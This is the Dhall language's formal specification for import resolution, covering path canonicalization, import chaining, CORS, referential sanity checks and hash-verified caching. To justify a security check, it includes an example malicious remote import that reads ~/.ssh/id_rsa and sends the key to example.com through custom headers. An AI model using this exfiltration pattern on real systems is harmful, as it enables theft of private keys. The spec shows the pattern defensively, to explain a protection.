# Import resolution

You can embed external Dhall expressions using an inline URL, file, or
environment variable.  For example:

```
    -- Expression imported from a URL
    let concatSep = http://prelude.dhall-lang.org/Prelude/Text/concatSep sha256:fa909c0b2fd4f9edb46df7ff72ae105ad0bd0ae00baa7fe53b0e43863f9bd34a

in  { name = env:USER as Text  -- Expression imported from the environment
    , age  = 23
    , hobbies = concatSep ", " [ "piano", "reading", "skiing" ]
    } : ./schema.dhall  -- Expression imported from a file
```

You can protect imports with integrity checks if you append SHA-256 hash (such
as the `concatSep` import above) and you can also import a value as raw `Text`
by appending `as Text` (such as the `env:USER` import above).

Imported expressions can transitively import other expressions.  For example,
the `./schema.dhall` file imported above might also import other files:

```
-- ./schema.dhall

{ name : ./schema/name.dhall
, age  : ./schema/age.dhall
, hobbies : ./schema/hobbies.dhall
}
```

... and if `./schema/hobbies.dhall` contained a relative import such as:

```
-- ./schema/hobbies.dhall

List ./hobby.dhall
```

... then the relative import of `./hobby.dhall` would actually refer to
`./schema/hobby.dhall`.  This is known as "import chaining": resolving imports
relative to the current expression's location.

This document formalizes the semantics for resolving those imports.

## Table of contents

* [Directories and files](#directories-and-files)
* [Canonicalization of directories](#canonicalization-of-directories)
* [Canonicalization of imports](#canonicalization-of-imports)
* [Chaining directories](#chaining-directories)
* [Chaining imports](#chaining-imports)
* [Duplicate imports](#duplicate-imports)
* [Import resolution judgment](#import-resolution-judgment)

## Directories and files

A directory is a list of path components, represented using the following
inductive notation:

```
directory =  ε                    ; 0 path components
          /  directory/component  ; At least 1 path component
```

In a complete file path, the directory comprises all but the last path component
and the last path component is the file.

Here are some examples of imports highlighting which part is the directory and
which part is the file:

```
directory
↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓↓
/ipfs/QmdtKd5Q7tebdo6rXfZed4kN6DXmErRQHJ4PsNCtca9GbB/Prelude/List/replicate
                                                                 ↑↑↑↑↑↑↑↑↑↑
                                                                 file


  directory
  ↓↓↓
../../Monoid  ; The first ".." does not belong to the path, but the second ".."
     ↑↑↑↑↑↑↑  ; does belong to the path
     file


directory = ε

./map  ; The directory is empty and does not include the leading "."
 ↑↑↑↑
 file


 directory
 ↓↓↓↓↓↓↓↓
~/.config/development.dhall
         ↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑↑
         file
```

See the grammar for more details about where the directory and file begin and
end.

## Canonicalization of directories

Canonicalization of directories is a function of the following form:

    canonicalize(directory₀) = directory₁

... where:

* `directory₀` (the input) is the directory to canonicalize
* `directory₁` (the output) is the canonicalized directory

Canonicalization has no effect on the empty directory:


    ───────────────────
    canonicalize(ε) = ε


Canonicalization removes path components named ".":


    canonicalize(directory₀) = directory₁
    ───────────────────────────────────────
    canonicalize(directory₀/.) = directory₁


Canonicalizing a path component named ".." removes that path component along
with the parent path component:


    canonicalize(directory₀) = directory₁/..
    ──────────────────────────────────────────────
    canonicalize(directory₀/..) = directory₁/../..


    canonicalize(directory₀) = directory₁/component
    ───────────────────────────────────────────────  ; If "component" is not
    canonicalize(directory₀/..) = directory₁         ; ".."


... unless there is no path component left to remove:


    canonicalize(directory₀) = ε
    ────────────────────────────
    canonicalize(directory₀/..) = /..


Canonicalization ignores directory components other than "." and "..":


    canonicalize(directory₀) = directory₁
    ─────────────────────────────────────────────────────────  ; If no other
    canonicalize(directory₀/component) = directory₁/component  ; rule matches


## Canonicalization of imports

You can also canonicalize imports by canonicalizing their directories.

Canonicalization of imports is a function of the following form:

    canonicalize(import₀) = import₁

... where:

* `import₀` (the input) is the import to canonicalize
* `import₁` (the output) is the canonicalized import

To canonicalize an import, canonicalize any path components belonging to the
directory:


    canonicalize(path₀) = path₁
    ─────────────────────────────────────
    canonicalize(path₀ file) = path₁ file


    canonicalize(path₀) = path₁
    ─────────────────────────────────────────
    canonicalize(. path₀ file) = . path₁ file


    canonicalize(path₀) = path₁
    ───────────────────────────────────────────
    canonicalize(.. path₀ file) = .. path₁ file


    canonicalize(path₀) = path₁
    ─────────────────────────────────────────
    canonicalize(~ path₀ file) = ~ path₁ file


    canonicalize(path₀) = path₁
    ─────────────────────────────────────────────────────────────────────────
    canonicalize(https://authority path₀ file) = https://authority path₁ file


    ───────────────────────────
    canonicalize(env:x) = env:x


Note that environment variables have no path components and are therefore
already in canonical form.

## Chaining directories

Chaining imports requires the ability to chain directories, using a function of
the following form:

    directory₀ </> directory₁ = directory₂

... where:

* `directory₀` (an input) is a directory
* `directory₁` (an input) is a directory
* `directory₂` (the output) is the concatenation of the two input directories

Chaining directories is the same as list concatenation of each input directory's
path components:


    ─────────────────
    path </> ε = path


    path₀ </> path₁ = path₂
    ───────────────────────────────────────────
    path₀ </> path₁/component = path₂/component


## Converting relative imports to relative references

It is possible to chain some local imports onto remote imports.  The basic form
this takes is:

  1. convert the local import to a relative reference
  2. resolve the relative reference using the URI reference resolution algorithm
     defined in [RFC 3986 section 5][].

This section defines how to convert a local import to a relative reference.

### Converting path components to relative references

A path segment can be converted to a fragment of a relative reference using a
function of the form:

    toRelativeRef(component) = ref

... where:

* `component` (the input) is a path component
* `ref` (the output) is a valid relative reference


[RFC 3986 section 2.3][] defines URI unreserved characters in ABNF as `ALPHA /
DIGIT / "-" / "." / "_" / "~"`.  `ALPHA` and `DIGIT` are defined in
[./dhall.abnf](./dhall.abnf).

Converting a path component consisting of a single character in the URI
unreserved set leaves the character unmodified:


    ────────────────────── ; c is in the URI unreserved set
    toRelativeRef(c) = "c"


Converting any other character results in the percent-encoded octets of the
character's UTF-8 representation:


    ─────────────────────────────────────── ; c is not in the URI unreserved set
    toRelativeRef(c) = percentEncodeUTF8(c)


For example, `toRelativeRef([)` is `"%5B"`, `toRelativeRef(⫽)` is `"%E2%AB%BD"`,
and `toRelativeRef(🐋)` is `"%F0%9F%90%8B"`.  Implementations SHOULD use upper-case
letters for hexadecimal digits in their percent-encoding.

Longer relative references are built up character-by-character from shorter references:


    toRelativeRef(c₀) = "c₁"  toRelativeRef(ss₀…) = "ss₁…"
    ──────────────────────────────────────────────────────
    toRelativeRef(css₀…) = "css₁…"


(The notation `css…` means the single character `c` followed by the rest of the
string `ss…` containing one or more characters.)

[RFC 3986 section 2.3]: https://tools.ietf.org/html/rfc3986#section-2.3

### Converting directories to relative references

A directory can be converted to a fragment of a relative reference using a
function of the form:

    toRelativeRef(directory) = ref

... where:

* `directory` (the input) is a directory
* `ref` (the output) is a string, which is either empty or a valid relative reference.

`toRelativeRef` is defined on directories in terms of `toRelativeRef` on
components:


    ────────────────────
    toRelativeRef(ε) = ε


    toRelativeRef(path₀) = path₁  toRelativeRef(component₀) = component₁
    ────────────────────────────────────────────────────────────────────
    toRelativeRef(path₀/component₀) = path₁/component₁


### Converting filenames to relative references

To convert a filename to a relative reference, we treat it as a standalone path
component and reuse the `toRelativeRef` definition on path components.

### Converting local imports to relative references

We can now define a function to convert imports to relative references:

    toRelativeRef(import) = ref

... where:

* `import` (the input) is an import
* `ref` (the output) is a relative reference

Converting a path beginning with "." or "..", and with an empty directory,
results in a simple relative reference:


    toRelativeRef(file₀) = file₁
    ──────────────────────────────────
    toRelativeRef(. ε file₀) = ./file₁


    toRelativeRef(file₀) = file₁
    ──────────────────────────────────
    toRelativeRef(.. ε file₀) = ../file₁


Otherwise, if the directory is nonempty, it must be converted too:


    toRelativeRef(path₀) = path₁  toRelativeRef(file₀) = file₁
    ────────────────────────────────────────────────────────── ; path₀ ≠ ε
    toRelativeRef(. path₀ file₀) = ./path₁/file₁


    toRelativeRef(path₀) = path₁  toRelativeRef(file₀) = file₁
    ────────────────────────────────────────────────────────── ; path₀ ≠ ε
    toRelativeRef(.. path₀ file₀) = ../path₁/file₁


## Chaining imports

The Dhall language supports absolute imports, such as URLs or absolute paths to
files.  Chaining imports that mix absolute and relative imports involves
computing the longest path relative to the last absolute import using a function
of the following form:

    import₀ </> import₁ = import₂

... where:

* `import₀` (an input) is the path of the parent relative to the current
  location
* `import₁` (an input) is the path of the child relative to the parent
* `import₂` (the output) is the path of the child relative to the current
  location

If a parent file path imports a child via a relative file path then you chain
their directories but prefer the file name of the child:


    path₀ </> path₁ = path₂
    ───────────────────────────────────────────
    path₀ file₀ </> . path₁ file₁ = path₂ file₁


    path₀ </> path₁ = path₂
    ───────────────────────────────────────────────
    . path₀ file₀ </> . path₁ file₁ = . path₂ file₁


    path₀ </> path₁ = path₂
    ─────────────────────────────────────────────────
    .. path₀ file₀ </> . path₁ file₁ = .. path₂ file₁


    path₀ </> path₁ = path₂
    ───────────────────────────────────────────────
    ~ path₀ file₀ </> . path₁ file₁ = ~ path₂ file₁


If the child import begins with a "..", add that as a path component in between
the parent and child directories:


    path₀ </> /.. = path₁   path₁ </> path₂ = path₃
    ──────────────────────────────────────────────
    path₀ file₀ </> .. path₂ file₁ = path₃ file₁


    path₀ </> /.. = path₁   path₁ </> path₂ = path₃
    ────────────────────────────────────────────────
    . path₀ file₀ </> .. path₂ file₁ = . path₃ file₁


    path₀ </> /.. = path₁   path₁ </> path₂ = path₃
    ──────────────────────────────────────────────────
    .. path₀ file₀ </> .. path₂ file₁ = .. path₃ file₁


    path₀ </> /.. = path₁   path₁ </> path₂ = path₃
    ────────────────────────────────────────────────
    ~ path₀ file₀ </> .. path₂ file₁ = ~ path₃ file₁


If the parent import is a URL and the child import begins with a "." or "..",
convert the child import to a relative reference and resolve the reference
according to the URI reference resolution algorithm defined in
[RFC 3986 section 5][]using the parent import as a base URL:


    toRelativeRef(. path₁ file₁) = ./path₂/file₂  rfc3986resolve(URL₀, ./path₂/file₂) = URL₂
    ────────────────────────────────────────────────────────────────────────────────────────
    URL₀ </> . path₁ file₁ = URL₂


    toRelativeRef(.. path₁ file₁) = ../path₂/file₂  rfc3986resolve(URL₀, ../path₂/file₂) = URL₂
    ───────────────────────────────────────────────────────────────────────────────────────────
    URL₀ </> .. path₁ file₁ = URL₂


The function `rfc3986resolve(url, relative-reference)` is used as a notational
shorthand for the algorithm defined in [RFC 3986 section 5][].

[RFC 3986 section 5]: https://tools.ietf.org/html/rfc3986#section-5

Note that there is no judgment which allows a child import that begins with "/"
or "~" to be resolved relative to a parent URL.

Import chaining preserves the header clause on the child import:


    import₀ </> URL₁ = URL₂
    ───────────────────────────────────────────────────
    import₀ </> URL₁ using headers = URL₂ using headers


... and the child import can reuse custom headers from the parent import if
the child is a relative import:


    URL₀ </> . path₁ file₁ = URL₂
    ─────────────────────────────────────────────────────────
    URL₀ using headers </> . path₁ file₁ = URL₂ using headers


    URL₀ </> .. path₁ file₁ = URL₂
    ──────────────────────────────────────────────────────────
    URL₀ using headers </> .. path₁ file₁ = URL₂ using headers


Otherwise, import chaining ignores the `using` clause on the parent import:


    URL₀ </> import₁ = import₂
    ────────────────────────────────────────
    URL₀ using headers </> import₁ = import₂


If the child is an absolute import, then the path to the parent import does not
matter and you import the child directly:


    ─────────────────────────────  ; If no other rule matches
    import₀ </> import₁ = import₁


## Duplicate imports

Importing the same canonical path twice must always return the same result
within a single run of the import resolution phase.  That means that import
resolution for the following program:

```
[ ./integer.dhall, ./integer.dhall ]
```

... must replace both occurrences of `./integer.dhall` with the same
expression if import resolution succeeds.

A conforming implementation can satisfy this obligation by caching imports, using
the canonical path as the lookup key.  Then for a duplicate import the
implementation can either:

* reuse the cached import to avoid having to retrieve the path again, or:
* retrieve the path again and fail import resolution if the result changed
  since the last retrieval

The following semantics model this by treating the context of importable
expressions as a pure, lazy, and unordered map from canonical paths to
expressions stored at those paths:

## Quoted paths

The grammar for imports permits quoted path components for both file paths:

    /"foo"/bar/"baz qux"

... and for URLs:

    https://example.com/foo/"bar?baz"?qux

Local import path components after parsing and in the binary encoding are always
unescaped (as if originally quoted).

URLs after parsing and in the binary encoding, conversely, are escaped (as if a
valid URL).

## Referential sanity check

The referential sanity check is used to ensure that a "referentially
transparent" import can never depend on a "referentially opaque" import.

A remote import such as `https://example.com/foo` is "referentially transparent"
because the contents of the import does not change depending on which machine
you import it from (with caveats, such as not tampering with DNS, etc.).

All non-remote imports are "referentially opaque" because their contents depend
on which machine that you import them from.

Referential transparency is checked using a judgment of the form:

    referentiallySane(parent, child)

... where

* `parent` (an input) is the canonicalized path of the parent import
* `child` (an input) is the canonicalized path of the child import

There is no output: either the judgment matches or it does not.

The rules for the referential transparency check ensure that a referentially
transparent parent can never import a referentially opaque child.  In practice
this means that remote imports can only import other remote imports (after
both imports have been canonicalized):


    ───────────────────────────────────────────────────────────────────────────────────────────
    referentiallySane(https://authority₀ directory₀ file₀, https://authority₁ directory₁ file₁)


... whereas non-remote imports can import anything:


    ────────────────────────────────────
    referentiallySane(path file, import)


    ──────────────────────────────────────
    referentiallySane(. path file, import)


    ───────────────────────────────────────
    referentiallySane(.. path file, import)


    ──────────────────────────────────────
    referentiallySane(~ path file, import)


    ────────────────────────────────
    referentiallySane(env:x, import)


This is a security check because it prevents remote imports from exfiltrating
local paths and environment variables using the language's support for
custom headers.  For example, this check prevents the following malicious
import:


    {- This file is hosted at `https://example.com/bad` and attempts to steal a
       sensitive file from the user's system using the language's support for
       custom headers
    -}
    https://example.com/recordHeaders using ./headers

... which in turn tries to import this file:

    {- This file is hosted at `https://example.com/headers` and attempts to
       read in the contents of the user's private key

       This import would be rejected because its canonical path is:

           https://example.com/headers

       ... whereas the canonical path of the private key is:

           ~/.ssh/id_rsa

       ... and the following `referentiallySane` judgment is not valid:

           referentiallySane(https://example.com/headers, ~/.ssh/id_rsa)

       ... because the referentially transparent remote import is trying to
       access a referentially opaque local import.
    -}
    [ { header = "Private Key", value = ~/.ssh/id_rsa as Text } ]


This is also a sanity check because a referentially transparent import cannot
truly be referentially transparent if it depends on any referentially opaque
imports.

## CORS

To protect against server-side request forging, Dhall rejects certain transitive
remote imports that are not CORS-enabled.  These remote imports
must return an `Access-Control-Allow-Origin` header that matches their parent
import.

CORS compliance is denoted by the following judgment:

    corsCompliant(parent, child, headers)

... where

* `parent` (an input) is the parent import that the import request originated
  from
    * `parent` might not necessarily be a remote import
* `child` (an input) is the child import that the parent imported
* `headers` (an input) is an unordered map from the child import's response
   header names to a list of values
    * Each header is associated with a list of values since a header can be
      specified multiple times

There is no output: either the judgment matches or it does not.

If the `parent` is not a remote import, then the `corsCompliant` judgment
passes:


    ────────────────────────────────────────
    corsCompliant(path file, child, headers)


    ──────────────────────────────────────────
    corsCompliant(. path file, child, headers)


    ───────────────────────────────────────────
    corsCompliant(.. path file, child, headers)


    ──────────────────────────────────────────
    corsCompliant(~ path file, child, headers)


    ────────────────────────────────────
    corsCompliant(env:x, child, headers)


If the `parent` and `child` import share the same origin, then the judgment also
passes:


    ──────────────────────────────────────────────────────────────────────────────────────────────
    corsCompliant(https://authority directory₀ file₀, https://authority directory₁ file₁, headers)


However, if the parent import is a remote import and the child import has a
different scheme or authority, then the response headers for the child import
must contain an `Access-Control-Allow-Origin` header that matches the parent
import or `*`:


    headers("Access-Control-Allow-Origin") = [ "*" ]
    ────────────────────────────────────────────────
    corsCompliant(parent, child, headers)


    headers("Access-Control-Allow-Origin") = [ "https://authority" ]
    ────────────────────────────────────────────────────────────────
    corsCompliant(https://authority directory file, child, headers)


If the `Access-Control-Allow-Origin` header does not match the scheme and
authority then the transitive remote import is rejected.  If there is not
exactly one value for the `Access-Control-Allow-Origin` header then the
transitive remote import is also rejected.

## Import resolution judgment

The import resolution phase replaces all imports with the expression located
at that import, transitively resolving imports within the imported expression if
necessary.

Import resolution is a function of the following form:

    (Δ, here) × Γ₀ ⊢ e₀ ⇒ e₁ ⊢ Γ₁

... where

* `(Δ, here)` (an input) is an ordered non-empty list of visited imports used to
  detect import cycles
    * `here` is the current import
    * `Δ` is the ordered history of 0 or more imports in the visited set that
      the interpreter visited along the way to `here`
* `Γ₀` (an input) is an unordered map from imports to expressions representing
  the state of the filesystem/environment/web before the import
    * `Γ₀(import)` means to retrieve the expression located at `import`
* `e₀` (an input) is the expression to resolve
* `e₁` (an output) is the import-free resolved expression
* `Γ₁` (an output) is an unordered map from imports to expressions representing
  the state of the filesystem/environment/web after the import
    * `Γ₁, import = x` means to save `x` to the resource identified by `import`

If an expression is an import (i.e. a URL, file path, or environment variable),
then you retrieve the expression from the canonicalized path and transitively
resolve imports within the retrieved expression:


    parent </> import₀ = import₁
    canonicalize(import₁) = child
    referentiallySane(parent, child)
    Γ(child) = e₀ using responseHeaders  ; Retrieve the expression, possibly
                                         ; binding any response headers to
                                         ; `responseHeaders` if child was a
                                         ; remote import
    corsCompliant(parent, child, responseHeaders)  ; If `child` was not a remote
                                                   ; import and therefore had no
                                                   ; response headers then skip
                                                   ; this CORS check
    (Δ, parent, child) × Γ₀ ⊢ e₀ ⇒ e₁ ⊢ Γ₁
    ε ⊢ e₁ : T
    ────────────────────────────────────  ; * child ∉ (Δ, parent)
    (Δ, parent) × Γ₀ ⊢ import₀ ⇒ e₁ ⊢ Γ₁  ; * import₀ ≠ missing


Carefully note that the fully resolved import must successfully type-check with
an empty context.  Imported expressions may not contain any free variables.

Also note that the `child ∉ Δ` forbids cyclic imports to prevent
non-termination from being (trivially) introduced via the import system.  An
import cycle is an import resolution error.

If an import ends with `as Text`, import the raw contents of the file as a
`Text` value instead of importing the file a Dhall expression:


    parent </> import₀ = import₁
    canonicalize(import₁) = child
    referentiallySane(parent, child)
    Γ(child) = "s" using responseHeaders  ; Read the raw contents of the file
    corsCompliant(parent, child, responseHeaders)
    ───────────────────────────────────────────
    (Δ, parent) × Γ ⊢ import₀ as Text ⇒ "s" ⊢ Γ


Carefully note that `"s"` in the above judgment is a Dhall `Text` literal.  This
implies that if you an import an expression as `Text` and you also protect the
import with a semantic integrity check then the you encode the string literal
as a Dhall expression and then hash that.  The semantic integrity check is not a
hash of the raw underlying text.

If an import ends with `using headers`, resolve the `headers` import and use
the resolved expression as additional headers supplied to the HTTP request:


    (Δ, parent) × Γ₀ ⊢ requestHeaders ⇒ resolvedRequestHeaders ⊢ Γ₁
    ε ⊢ resolvedRequestHeaders : List { header : Text, value : Text }
    resolvedRequestHeaders ⇥ normalizedRequestHeaders
    parent </> https://authority directory file using normalizedRequestHeaders = import
    canonicalize(import) = child
    referentiallySane(parent, child)
    Γ₁(child) = e₀ using responseHeaders
      ; Append normalizedRequestHeaders to the above request's headers
    corsCompliant(parent, child, responseHeaders)
    (Δ, parent, child) × Γ₁ ⊢ e₀ ⇒ e₁ ⊢ Γ₂
    ε ⊢ e₁ : T
    ──────────────────────────────────────────────────────────────────────────  ; * child ∉ Δ
    (Δ, parent) × Γ₀ ⊢ https://authority directory file using requestHeaders ⇒ e₁ ⊢ Γ₂


For example, if `normalizedRequestHeaders` in the above judgment was:

    [ { header = "Authorization", value = "token 5199831f4dd3b79e7c5b7e0ebe75d67aa66e79d4" }
    ]

... then the HTTPS request for `https://authority directory file` would
include the following header line:

    Authorization: token 5199831f4dd3b79e7c5b7e0ebe75d67aa66e79d4

If the import is protected with a `sha256:base16Hash` integrity check, then:

* the import's normal form is encoded to a binary representation
* the binary representation is hashed using SHA-256
* the SHA-256 hash is base16-encoded
* the base16-encoded result has to match the integrity check

An implementation MUST attempt to cache imports protected with an integrity
check using the hash as the lookup key.  An implementation that caches imports
in this way so MUST:

* Cache the fully resolved, αβ-normalized expression, and encoded expression
* Store the cached expression in `"${XDG_CACHE_HOME}/dhall/1220${base16Hash}"` if
  the `$XDG_CACHE_HOME` environment variable is defined and the path is readable
  and writeable
* Otherwise, store the cached expression in
  `"${HOME}/.cache/dhall/1220${base16Hash}"` if the `$HOME` environment variable is
  defined and the path is readable and writeable
* Otherwise, not cache the expression at all

Cache filenames are prefixed with `1220` so that the filename is a valid
[multihash][] SHA-256 value.

An implementation SHOULD warn the user if the interpreter is unable to cache the
expression due to the environment variables being unset or the filesystem paths
not being readable or writeable.

Similarly, an implementation MUST follow these steps when importing an
expression protected by a semantic integrity check:

* Check if there is a Dhall expression stored at either
  `"${XDG_CACHE_HOME}/dhall/1220${base16Hash}"` or
  `"${HOME}/.cache/dhall/1220${base16Hash}"`
* If the file exists and is readable, verify the file's byte contents match the
  hash and then decode the expression from the bytes using the `decode` judgment
  instead of importing the expression
* Otherwise, import the expression as normal

An implementation MUST fail and alert the user if hash verification fails,
either when importing an expression for the first time or importing from the
local cache.

Or in judgment form:


    Γ("${XDG_CACHE_HOME}/dhall/1220${base16Hash}") = binary
    sha256(binary) = byteHash
    base16Encode(byteHash) = base16Hash                ; Verify the hash
    decode(binary) = e
    ─────────────────────────────────────────────────  ; Import is already cached under `$XDG_CACHE_HOME`
    (Δ, here) × Γ ⊢ import₀ sha256:base16Hash ⇒ e ⊢ Γ


    Γ("${HOME}/.cache/dhall/1220${base16Hash}") = binary
    sha256(binary) = byteHash
    base16Encode(byteHash) = base16Hash                ; Verify the hash
    decode(binary) = e
    ─────────────────────────────────────────────────  ; Otherwise, import is cached under `$HOME`
    (Δ, here) × Γ ⊢ import₀ sha256:base16Hash ⇒ e ⊢ Γ


    (Δ, here) × Γ₀ ⊢ import₀ ⇒ e₁ ⊢ Γ₁
    ε ⊢ e₁ : T
    e₁ ⇥ e₂
    e₂ ↦ e₃
    encode(e₃) = binary
    sha256(binary) = byteHash
    base16Encode(byteHash) = base16Hash  ; Verify the hash
    ──────────────────────────────────────────────────────────────────────────────────────────────────────  ; Import is not cached, try to save under `$XDG_CACHE_HOME`
    (Δ, here) × Γ₀ ⊢ import₀ sha256:base16Hash ⇒ e₁ ⊢ Γ₁, "${XDG_CACHE_HOME}/dhall/1220${base16Hash}" = binary


    (Δ, here) × Γ₀ ⊢ import₀ ⇒ e₁ ⊢ Γ₁
    ε ⊢ e₁ : T
    e₁ ⇥ e₂
    e₂ ↦ e₃
    encode(e₃) = binary
    sha256(binary) = byteHash
    base16Encode(byteHash) = base16Hash  ; Verify the hash
    ───────────────────────────────────────────────────────────────────────────────────────────────────  ; Otherwise, try `HOME`
    (Δ, here) × Γ₀ ⊢ import₀ sha256:base16Hash ⇒ e₁ ⊢ Γ₁, "${HOME}/.cache/dhall/1220${base16Hash}" = binary


    (Δ, here) × Γ₀ ⊢ import₀ ⇒ e₁ ⊢ Γ₁
    ε ⊢ e₁ : T
    e₁ ⇥ e₂
    e₂ ↦ e₃
    encode(e₃) = binary
    sha256(binary) = byteHash
    base16Encode(byteHash) = base16Hash                  ; Verify the hash
    ──────────────────────────────────────────────────── ; Otherwise, don't cache
    (Δ, here) × Γ₀ ⊢ import₀ sha256:base16Hash ⇒ e₁ ⊢ Γ₁


... where:

* The `sha256` judgment stands in for the the SHA-256 hashing algorithm
  specified in
  [RFC4634 - Section 8.2.2](https://tools.ietf.org/html/rfc4634#section-8.2.2),
  treated as a pure function from an arbitrary byte array to a 64-byte array
* The `base16Encode` judgement stands in for the base-16 encoding algorithm
  specified in
  [RFC4648 - Section 8](https://tools.ietf.org/html/rfc4648#section-8), treated
  as a pure function from a byte array to text

Resolution of expressions might not be always successful: pure expressions are
always resolved, the `missing` keyword never resolves, and imports might not 
resolve in cases like:

* an environment variable is not defined
* file doesn't exist
* URL is not reachable
* parse error
* hash mismatch
* typecheck error

By using the `?` operator, expressions are alternatively resolved, in
left-to-right order:


    (Δ, here) × Γ₀ ⊢ e₀ ⇒ e₂ ⊢ Γ₁
    ────────────────────────────────────
    (Δ, here) × Γ₀ ⊢ (e₀ ? e₁) ⇒ e₂ ⊢ Γ₁


    (Δ, here) × Γ₀ ⊢ e₁ ⇒ e₂ ⊢ Γ₁
    ────────────────────────────────────  ; if `e₀` fails to resolve
    (Δ, here) × Γ₀ ⊢ (e₀ ? e₁) ⇒ e₂ ⊢ Γ₁


For all other cases, recursively descend into sub-expressions:


    ───────────────────────────────
    (Δ, here) × Γ₀ ⊢ x@n ⇒ x@n ⊢ Γ₁


    (Δ, here) × Γ₀ ⊢ A₀ ⇒ A₁ ⊢ Γ₁   (Δ, here) × Γ₁ ⊢ b₀ ⇒ b₁ ⊢ Γ₂
    ─────────────────────────────────────────────────────────────
    (Δ, here) × Γ₀ ⊢ λ(x : A₀) → b₀ ⇒ λ(x : A₁) → b₁ ⊢ Γ₂


    …


    ────────────────────────────────
    (Δ, here) × Γ₀ ⊢ Kind ⇒ Kind ⊢ Γ₁

[multihash]: https://github.com/multiformats/multihash
